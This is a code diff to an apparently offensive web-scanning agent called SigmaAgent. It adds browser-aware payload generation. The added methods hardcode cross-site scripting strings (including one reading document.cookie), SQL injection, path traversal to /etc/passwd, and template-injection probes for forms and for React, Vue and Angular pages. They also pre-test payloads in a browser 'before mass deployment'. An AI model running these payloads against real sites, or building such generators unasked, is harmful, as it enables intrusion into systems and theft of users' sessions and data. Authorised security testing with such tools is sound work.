@@ -15,6 +15,11 @@ from backend.core.proxy import network_interceptor
 from backend.core.queue import command_lane, LanePriority
 from backend.api.socket_manager import publish_request_event
 
+# Browser Integration (Phase 2)
+from backend.core.browser_orchestrator import BrowserOrchestrator
+from backend.core.hybrid_session_manager import HybridSessionManager
+from backend.core.forensic_collector import ForensicCollector
+
 # Import Arsenals
 from backend.modules.tech.sqli import SQLInjectionProbe
 from backend.modules.tech.jwt import JWTTokenCracker
@@ -28,11 +33,14 @@ from backend.modules.logic.escalator import TheEscalator
 class SigmaAgent(BaseAgent):
     """
     AGENT SIGMA: THE ORCHESTRATOR
-    Role: Execution Pipeline & Generative Weaponssmith.
+    Role: Execution Pipeline & Generative Weaponssmith with Browser-Aware Payloads.
     Capabilities:
     - Hosts all 9 Arsenal Modules natively.
     - Resolves pure math payloads to network IO state arrays.
     - AI-Powered Context-Aware Payload Generation.
+    - Browser-aware payload generation based on DOM structure
+    - Form-specific payload targeting
+    - Framework-specific exploits
     """
     def __init__(self, bus):
         super().__init__("agent_sigma", bus)
@@ -49,6 +57,11 @@ class SigmaAgent(BaseAgent):
         
         # Hybrid Engine State Map
         self.hybrid_token = None
+        
+        # Browser Integration
+        self.browser = BrowserOrchestrator()
+        self.session_manager = HybridSessionManager()
+        self.forensics = ForensicCollector()
 
         self.arsenal = {
             "tech_sqli": SQLInjectionProbe(),
@@ -362,3 +375,178 @@ class SigmaAgent(BaseAgent):
         elif method == "url":
             return urllib.parse.quote(payload)
         return payload
+
+    # ============ BROWSER-AWARE PAYLOAD GENERATION (Phase 2) ============
+    
+    async def _generate_browser_aware_payloads(self, url: str, scan_id: str) -> list:
+        """Generate payloads based on actual DOM structure and forms."""
+        try:
+            print(f"[{self.name}] Analyzing DOM structure for browser-aware payloads...")
+            
+            # Analyze DOM structure
+            dom_structure = await self._analyze_dom_structure(url)
+            
+            if not dom_structure:
+                return []
+            
+            payloads = []
+            
+            # Generate form-specific payloads
+            for form in dom_structure.get("forms", []):
+                form_payloads = await self._generate_form_specific_payloads(form, url)
+                payloads.extend(form_payloads)
+            
+            # Generate framework-specific payloads
+            framework = dom_structure.get("framework")
+            if framework:
+                framework_payloads = self._generate_framework_payloads(framework, url)
+                payloads.extend(framework_payloads)
+            
+            print(f"[{self.name}] Generated {len(payloads)} browser-aware payloads")
+            
+            return payloads
+            
+        except Exception as e:
+            print(f"[{self.name}] Browser-aware payload generation failed: {e}")
+            return []
+    
+    async def _analyze_dom_structure(self, url: str) -> dict:
+        """Analyze DOM structure to understand forms, inputs, and framework."""
+        try:
+            # Navigate and analyze page
+            result = await self.browser.navigate(url, stealth=False)
+            
+            if not result.get("success"):
+                return {}
+            
+            # Detect framework
+            framework = await self.browser.detect_framework(url)
+            
+            # Extract forms and inputs (would use actual browser API)
+            dom_structure = {
+                "framework": framework,
+                "forms": [],
+                "inputs": [],
+                "buttons": []
+            }
+            
+            # Placeholder - would extract actual DOM elements
+            # In real implementation, this would use OpenClaw to:
+            # - Find all forms
+            # - Extract input fields with types, names, IDs
+            # - Identify submit buttons
+            # - Detect validation patterns
+            
+            return dom_structure
+            
+        except Exception as e:
+            print(f"[{self.name}] DOM analysis failed: {e}")
+            return {}
+    
+    async def _generate_form_specific_payloads(self, form: dict, url: str) -> list:
+        """Generate payloads targeted at specific form fields."""
+        payloads = []
+        
+        try:
+            form_action = form.get("action", url)
+            form_method = form.get("method", "POST")
+            
+            for input_field in form.get("inputs", []):
+                field_name = input_field.get("name", "")
+                field_type = input_field.get("type", "text")
+                
+                # Generate payloads based on field type
+                if field_type == "email":
+                    payloads.extend([
+                        f"{field_name}=test@example.com<script>alert(1)</script>",
+                        f"{field_name}=test@example.com'><img src=x onerror=alert(1)>",
+                        f"{field_name}=admin@localhost"
+                    ])
+                elif field_type == "password":
+                    payloads.extend([
+                        f"{field_name}=' OR '1'='1",
+                        f"{field_name}=admin' --",
+                        f"{field_name}=<script>alert(document.cookie)</script>"
+                    ])
+                elif field_type == "number":
+                    payloads.extend([
+                        f"{field_name}=-1",
+                        f"{field_name}=999999999",
+                        f"{field_name}=0.0001",
+                        f"{field_name}=1' OR '1'='1"
+                    ])
+                elif field_type == "search":
+                    payloads.extend([
+                        f"{field_name}=<script>alert(1)</script>",
+                        f"{field_name}={{{{7*7}}}}",
+                        f"{field_name}=${{7*7}}"
+                    ])
+                else:  # text, textarea, etc.
+                    payloads.extend([
+                        f"{field_name}=<script>alert(1)</script>",
+                        f"{field_name}=' OR 1=1--",
+                        f"{field_name}=../../../etc/passwd",
+                        f"{field_name}={{{{config}}}}"
+                    ])
+            
+        except Exception as e:
+            print(f"[{self.name}] Form-specific payload generation failed: {e}")
+        
+        return payloads
+    
+    def _generate_framework_payloads(self, framework: str, url: str) -> list:
+        """Generate framework-specific exploit payloads."""
+        payloads = []
+        
+        if framework == "react":
+            payloads.extend([
+                "?search=javascript:alert(1)",
+                "?redirect=javascript:alert(document.domain)",
+                "?dangerouslySetInnerHTML=<img src=x onerror=alert(1)>",
+                "?__html=<script>alert(1)</script>"
+            ])
+        elif framework == "vue":
+            payloads.extend([
+                "?v-html=<img src=x onerror=alert(1)>",
+                "?{{constructor.constructor('alert(1)')()}}",
+                "?search={{7*7}}"
+            ])
+        elif framework == "angular":
+            payloads.extend([
+                "?search={{constructor.constructor('alert(1)')()}}",
+                "?{{$on.constructor('alert(1)')()}}",
+                "?search={{7*7}}"
+            ])
+        
+        return payloads
+    
+    async def _test_payload_browser(self, url: str, payload: str, scan_id: str) -> dict:
+        """Pre-test payload in browser before mass deployment."""
+        try:
+            print(f"[{self.name}] Pre-testing payload in browser: {payload[:50]}...")
+            
+            # Test payload using browser
+            result = await self.browser.test_payload(url, payload, param="test")
+            
+            if result.get("triggered"):
+                print(f"[{self.name}] [PRE-TEST SUCCESS] Payload effective: {payload[:50]}")
+                
+                # Capture evidence
+                await self.forensics.capture_screenshot(
+                    scan_id=scan_id,
+                    context=result.get("context"),
+                    engine="openclaw",
+                    label="payload_pretest"
+                )
+                
+                return {
+                    "effective": True,
+                    "payload": payload,
+                    "evidence": "Payload triggered in browser pre-test"
+                }
+            
+            return {"effective": False, "payload": payload}
+            
+        except Exception as e:
+            print(f"[{self.name}] Payload pre-test failed: {e}")
+            return {"effective": False, "payload": payload, "error": str(e)}
